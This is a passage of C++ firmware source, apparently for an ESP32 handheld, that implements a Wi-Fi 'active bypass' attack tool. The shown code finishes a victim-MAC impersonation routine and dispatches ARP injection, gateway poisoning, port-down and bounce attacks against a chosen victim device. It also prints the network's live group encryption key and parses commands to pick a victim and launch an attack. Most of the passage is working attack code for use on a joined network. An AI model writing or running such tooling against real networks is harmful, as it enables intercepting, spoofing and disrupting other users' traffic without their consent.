            snprintf(b, sizeof(b), "frames to victim MAC: %lu", (unsigned long)rx);
            dm.fillRect(0, outputY + LINE_HEIGHT * 9, SCREEN_WIDTH, LINE_HEIGHT, TFT_BLACK);
            dm.setTextColor(rx ? TFT_GREEN : TFT_DARKGREY);
            dm.setCursor(6, outputY + LINE_HEIGHT * 9); dm.printText(b);
            lastDraw = millis();
        }
        vTaskDelay(pdMS_TO_TICKS(20));
    }
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    s_victimSteal = false;

    isoSetStaMac(orig);                              // ALWAYS restore our identity
    WiFi.reconnect();
    dm.clearScreen(); dm.printCommandScreen();
}

// ── auto — one-shot reachability sweep ───────────────────────────────────────────
// inject/portup/portdown are interactive (they hold until q), so 'auto' runs the
// one-shot, non-destructive bounce probe (IP-layer reachability) and leaves the
// held attacks to be launched individually from the menu.
static void isoAuto(int idx) {
    isoBounce(idx);
}

// ── attack dispatch ──────────────────────────────────────────────────────────────
static void isoRunAttack(int idx, IsoAttack attack) {
    auto& dm = displayManager;
    switch (attack) {
        case ISO_INJECT:   isoInjectArp(idx); return;
        case ISO_PORTUP:   isoGwPoison(idx);  return;
        case ISO_BOUNCE:   isoBounce(idx);    return;
        case ISO_PORTDOWN: isoPortDown(idx);  return;
        case ISO_AUTO:     isoAuto(idx);      return;
        default: break;                       // ISO_BCAST falls through
    }
    // bcast: a to-DS broadcast frame would need our PAIRWISE key (PTK) to be
    // accepted by the AP, which raw 80211_tx can't supply — so it's not separately
    // injectable. The same "is the victim reachable" question is answered by
    // 'inject' (GTK broadcast) and 'bounce' (IP layer via gateway).
    isoHeader("bcast");
    dm.setTextColor(TFT_YELLOW); dm.println("Not separately injectable:");
    dm.setTextColor(0x7BEF);     dm.println("a to-DS frame needs our pairwise");
    dm.println("key (PTK), which raw TX can't add.");
    dm.println("");
    dm.setTextColor(TFT_WHITE);  dm.println("Use 'inject' or 'bounce' instead");
    dm.println("to test victim reachability.");
    dm.printCommandScreen();
}

// ── is cctest — validate the CCMP engine on-device (no transmit) ─────────────────
// Runs the round-trip self-test, then shows the live GTK if associated. This is
// the safe way to prove the inject crypto works before any frame goes on the air.
static void isoCcmpTest() {
    auto& dm = displayManager;
    isoHeader("CCMP self-test");
    bool pass = isoCcmpSelfTest();
    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 2);
    dm.printText("AES-CCMP round-trip:");
    dm.setTextColor(pass ? TFT_GREEN : TFT_RED);
    dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText(pass ? "PASS" : "FAIL");

    uint8_t gtk[32]; int len = 0;
    int y = outputY + LINE_HEIGHT * 5;
    if (WiFi.status() == WL_CONNECTED && netspyGetGtk(gtk, &len)) {
        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, y); dm.printText("live GTK:"); y += LINE_HEIGHT;
        char row[48]; int n = 0;
        for (int i = 0; i < len; i++) {
            n += snprintf(row + n, sizeof(row) - n, "%02X ", gtk[i]);
            if ((i & 7) == 7) { dm.setTextColor(TFT_WHITE); dm.setCursor(10, y); dm.printText(row); y += LINE_HEIGHT; n = 0; }
        }
        if (n) { dm.setTextColor(TFT_WHITE); dm.setCursor(10, y); dm.printText(row); }
    } else {
        dm.setTextColor(0x7BEF); dm.setCursor(6, y);
        dm.printText(WiFi.status() == WL_CONNECTED ? "GTK unreadable (offset?)"
                                                   : "connect to see live GTK");
    }
    dm.printCommandScreen();
}

// ── entry ────────────────────────────────────────────────────────────────────────
void runIsoscan(char* args) {
    auto& dm = displayManager;
    if (args && (args[0] == 'c' || args[0] == 'C')) { isoCcmpTest(); return; }
    if (WiFi.status() != WL_CONNECTED) {
        isoHeader("active bypass");
        dm.setTextColor(TFT_RED);   dm.println("Connect first:  cw <ssid>");
        dm.setTextColor(0x7BEF);    dm.println("(needs to be on the target net)");
        dm.printCommandScreen();
        return;
    }
    if (netspyDeviceCount() <= 0) {
        isoHeader("active bypass");
        dm.setTextColor(TFT_RED);   dm.println("No devices discovered.");
        dm.setTextColor(0x7BEF);    dm.println("Run 'ns' first to find victims,");
        dm.setTextColor(0x7BEF);    dm.println("then 'is' to attack one.");
        dm.printCommandScreen();
        return;
    }

    // Parse args: optional `ns<#>` victim index + optional attack keyword.
    int victim = -1;
    IsoAttack attack = ISO_NONE;
    if (args && args[0]) {
        char buf[64]; strncpy(buf, args, sizeof(buf) - 1); buf[sizeof(buf) - 1] = '\0';
        for (char* tok = strtok(buf, " "); tok; tok = strtok(nullptr, " ")) {
            if ((tok[0] == 'n' || tok[0] == 'N') && (tok[1] == 's' || tok[1] == 'S') &&
                isdigit((unsigned char)tok[2])) {
                victim = atoi(tok + 2);
            } else {
                IsoAttack a = isoAttackFromKey(tok);
                if (a != ISO_NONE) attack = a;
            }
        }
    }

    // Victim: use the CLI index if valid, else open the picker.
    if (victim < 0 || victim >= netspyDeviceCount()) {
        victim = isoPickVictim();
        if (victim < 0) { dm.clearScreen(); dm.printCommandScreen(); return; }
    }

    // Attack: use the CLI keyword, else open the menu.
    if (attack == ISO_NONE) {
        attack = isoAttackMenu(victim);
        if (attack == ISO_NONE) { dm.clearScreen(); dm.printCommandScreen(); return; }
    }

    if (!isoConfirm(victim, attack)) { dm.clearScreen(); dm.printCommandScreen(); return; }
    isoRunAttack(victim, attack);
}
